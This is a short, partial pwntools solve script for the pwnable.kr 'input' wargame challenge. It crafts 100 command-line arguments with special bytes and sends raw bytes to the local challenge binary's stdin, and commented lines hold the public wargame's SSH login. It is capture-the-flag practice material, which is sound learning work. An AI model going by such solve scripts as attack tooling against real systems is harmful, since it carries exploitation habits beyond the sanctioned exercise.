from pwn import *
import time

context.log_level = "DEBUG"

#s = ssh(host='pwnable.kr', port=2222, user='input2', password='guest')
#s.download_file('input')
#s.download_file('input.c')

args = ["A"]*64 + ["\x00"] + ["\x20\x0a\x0d"] + ["A"]*33
print args

proc_arr = ["./input"] + args
print len(proc_arr)
p = process(proc_arr)
#p = s.process(proc_arr)

#print p.recvuntil('State 1 clear!')
print p.recv()

#gdb.attach(p,
##b *main+227
#'''
#b *main+273
#c
#'''
#)
p.sendline("\x00\x0a\x00\xff")
time.sleep(5)
p.sendline("\x00\x0a\x02\xff")
print p.recv()


#p.sendline(str(key))
#
#print p.recv()
#
#p.close()

